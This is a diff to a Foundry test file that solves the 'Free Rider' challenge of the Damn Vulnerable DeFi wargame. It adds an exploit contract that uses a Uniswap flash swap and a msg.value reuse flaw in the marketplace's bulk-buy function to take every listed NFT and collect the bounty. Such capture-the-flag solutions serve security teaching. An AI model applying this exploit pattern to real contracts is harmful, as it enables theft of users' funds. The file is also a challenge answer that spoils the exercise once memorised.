@@ -11,6 +11,9 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -123,7 +126,18 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        MaliciousUser attacker = new MaliciousUser(uniswapPair, weth, marketplace, recoveryManager, nft, player);
+
+
+        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+        weth.approve(address(attacker), PLAYER_INITIAL_ETH_BALANCE);
+
+        attacker.flashSwap(33e18);
+        attacker.transferToManager();
+
+        uint rest = weth.balanceOf(player);
+        weth.withdraw(rest);
+    
     }
 
     /**
@@ -145,4 +159,91 @@ contract FreeRiderChallenge is Test {
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
     }
+}
+
+contract MaliciousUser is IUniswapV2Callee, IERC721Receiver {
+
+    IUniswapV2Pair pair;
+    WETH weth;
+    FreeRiderNFTMarketplace marketplace;
+    FreeRiderRecoveryManager recoveryManager;
+    DamnValuableNFT nft;
+    address player;
+
+    uint256[] tokenIds = new uint256[](6);
+
+    constructor(IUniswapV2Pair _pair, WETH _weth, FreeRiderNFTMarketplace _marketplace, FreeRiderRecoveryManager _recoveryManager, DamnValuableNFT _nft,
+                address _player) {
+        pair = _pair;
+        weth = _weth;
+        marketplace = _marketplace;
+        recoveryManager = _recoveryManager;
+        nft = _nft;
+        player = _player;
+    }
+
+    function flashSwap(uint256 wethAmount) external {
+        // Need to pass some data to trigger uniswapV2Call
+        bytes memory data = abi.encode(address(weth), msg.sender);
+
+        // amount0Out us WETH, amount1Out is Token
+        pair.swap(wethAmount, 0, address(this), data);
+    }
+
+    // This function is called by the DAI/WETH pair contract
+    function uniswapV2Call(
+        address sender,
+        uint256 amount0,
+        uint256 /*amount1*/,
+        bytes calldata data
+    ) external {
+        require(msg.sender == address(pair), "not pair");
+        require(sender == address(this), "not sender");
+
+        (address tokenBorrow, address caller) =
+            abi.decode(data, (address, address));
+
+        // Your custom code would go here. For example, code to arbitrage.
+        require(tokenBorrow == address(weth), "token borrow != WETH");
+
+        uint256 amountToRepay;
+
+        // about 0.3% fee, +1 to round up
+        uint256 fee = (amount0 * 3) / 997 + 1;
+        amountToRepay = amount0 + fee;
+
+        // Transfer flash swap fee from caller
+        weth.transferFrom(caller, address(this), fee);
+
+        uint256 balanceAll = weth.balanceOf(address(this));
+        weth.withdraw(balanceAll);
+
+        for(uint256 i; i<marketplace.offersCount(); i++){
+            tokenIds[i] = i;
+        }
+
+        marketplace.buyMany{value: address(this).balance}(tokenIds);
+        weth.deposit{value: amountToRepay}();
+        
+        // Repay
+        uint256 rest = address(this).balance - amountToRepay;
+        weth.transfer(address(pair), amountToRepay);
+        (bool s, ) = player.call{value: rest}("");
+        require(s);
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    function transferToManager() public {
+
+        nft.setApprovalForAll(address(this), true);
+        bytes memory message = abi.encode(player);
+        for(uint256 i; i<tokenIds.length; i++){
+            nft.safeTransferFrom(nft.ownerOf(i), address(recoveryManager), i, message);
+        }
+    }
+
+    receive() external payable{}
 }
